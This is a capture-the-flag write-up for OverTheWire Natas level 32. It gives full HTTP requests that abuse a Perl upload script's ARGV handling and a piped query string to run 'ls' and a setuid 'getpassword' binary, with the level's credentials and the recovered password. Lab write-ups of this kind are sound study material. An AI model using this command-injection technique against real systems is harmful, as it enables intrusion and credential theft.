- This level is very similar to the last one, except we need to have RCE (Remote Code Execution) in this case
- We prepare a similar request as before, the only difference being we pass in the payload in the query param with a `|` symbol, and we give the command we want to execute
- We prepare the following request:
```http
POST /index.pl?./ls%20-l%20.%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------71077665716742283103444322512
Content-Length: 488
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------71077665716742283103444322512
Content-Disposition: form-data; name="file";

ARGV
-----------------------------71077665716742283103444322512
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

Serial,Name,Details
1,Test,45
2,Query,Abc
-----------------------------71077665716742283103444322512
Content-Disposition: form-data; name="submit"

Upload
-----------------------------71077665716742283103444322512--

```
- We supply the command `ls -la .` in the query params, with the spaces being URL encoded. This prints the current directory contents as follows:
```html
<table class="sortable table table-hover table-striped"><tr><th>
</th></tr><tr><td>total 156
</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Sep 19 07:03 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16088 Sep 19 07:03 getpassword
</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Sep 19 07:03 index-source.html
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Sep 19 07:03 index.pl
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Sep 19 07:03 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Sep 19 07:03 sorttable.js
</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Oct 14 13:59 tmp
</td></tr></table>
```
- According to the level, we have a binary in the webroot which we need to execute. Upon going through the contents of the directory, we see that the binary is `getpassword` with the `setuid` bit set. This is going to help us read the password of the next level
- So, we execute the binary by supplying it in our payload like this:
```http
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------71077665716742283103444322512
Content-Length: 488
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------71077665716742283103444322512
Content-Disposition: form-data; name="file";

ARGV
-----------------------------71077665716742283103444322512
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

Serial,Name,Details
1,Test,45
2,Query,Abc
-----------------------------71077665716742283103444322512
Content-Disposition: form-data; name="submit"

Upload
-----------------------------71077665716742283103444322512--
```
- Upon firing the request, we get the following response with the password:
```
<table class="sortable table table-hover table-striped">
	<tr>
		<th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ</th>
	</tr>
</table>
```
- Hence, obtained password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ